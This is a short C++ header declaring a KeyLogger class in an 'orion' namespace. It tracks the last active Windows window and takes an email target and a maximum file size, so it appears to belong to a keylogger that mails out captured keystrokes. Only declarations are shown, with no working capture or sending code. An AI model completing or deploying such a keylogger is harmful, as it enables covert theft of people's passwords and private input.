#pragma once

#include "logger.h"

#include <Windows.h>

namespace orion {

	class KeyLogger : public Logger {
		size_t max_file_sz;
		HWND last_window;
	public:
		KeyLogger(const Email &, size_t = kEmailMaxFileSz);
		virtual ErrorCode Log() override;
		size_t get_max_file_sz() const;
	};

}  // namespace orion
